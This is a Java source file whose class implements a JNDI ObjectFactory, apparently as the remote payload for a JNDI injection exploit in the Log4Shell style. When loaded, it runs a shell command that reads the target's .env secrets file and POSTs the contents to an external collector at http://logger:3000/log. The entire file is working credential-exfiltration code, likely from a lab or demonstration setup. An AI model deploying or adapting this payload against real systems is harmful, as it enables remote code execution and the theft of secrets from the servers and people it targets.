import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Hashtable;
import java.util.stream.Collectors;

public class EnvVariables implements ObjectFactory {
	@Override
	public Object getObjectInstance(Object o, Name name, Context context, Hashtable<?, ?> hashtable) throws Exception {
		String[] cmd = {
			"/bin/sh",
			"-c",
			"cat .env"
		};

		Process p = Runtime.getRuntime().exec(cmd);
		p.waitFor();

		System.out.println("Test");
		BufferedReader stream = new BufferedReader(new InputStreamReader(p.getInputStream()));
		String stdout = stream.lines().collect(Collectors.joining("\n")).replace("=", " > ");

		URL url = new URL("http://logger:3000/log");
		HttpURLConnection con = (HttpURLConnection) url.openConnection();
		con.setDoOutput(true);
		// con.setRequestProperty("Content-Type", "application/json; charset=utf-8");
		con.setRequestMethod("POST");

		OutputStreamWriter writer = new OutputStreamWriter(con.getOutputStream());
		writer.write(stdout);
		writer.flush();

		System.out.println(con.getResponseCode());

		return  null;

	}
}
